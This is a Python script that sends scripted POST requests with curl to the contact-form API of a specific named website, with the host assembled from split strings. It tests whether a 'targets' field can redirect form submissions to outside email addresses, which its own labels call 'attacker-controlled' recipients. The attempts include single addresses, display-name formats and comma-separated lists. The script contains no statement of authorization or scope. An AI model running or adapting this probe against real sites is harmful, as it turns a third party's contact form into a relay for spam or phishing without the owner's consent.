import subprocess, json, time
H = "infinity" + "capital" + "." + "bh"
S = "https://www." + H + "/api/send"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36"


def send(targets, extra=None, fname="QA"):
    d = dict(fname=fname, lname="Tester", areacode="973", tel="5551234",
             cname="QA Tester", subject="probe", msg="probe body", check="on")
    if targets is not None:
        d["targets"] = targets
    if extra:
        d.update(extra)
    args = ["curl", "-s", "-i", "-X", "POST", S, "-A", UA]
    for k, v in d.items():
        args += ["-F", "%s=%s" % (k, v)]
    r = subprocess.run(args, capture_output=True, timeout=40, text=True).stdout
    head = r.split("\r\n\r\n", 1)
    status = head[0].split("\n")[0].strip()
    body = head[-1][:200].replace("\n", " ")
    return status, body


cases = [
    ("no targets field (omit)", None),
    ("targets=garbage-not-an-email", "garbage-not-an-email"),
    ("targets=attacker-controlled EXT domain", "securitytest+" + str(int(time.time())) + "@protonmail.com"),
    ("targets=attacker-controlled EXT domain 2", "securitytest2+" + str(int(time.time())) + "@gmail.com"),
    ("targets with display-name format", "QA Tester <securitytest3@protonmail.com>"),
    ("targets comma-list two ext recips", "a@protonmail.com, b@gmail.com"),
]
for name, t in cases:
    st, bd = send(t)
    print("[%s]\n   %s\n   %s\n" % (name, st, bd), flush=True)
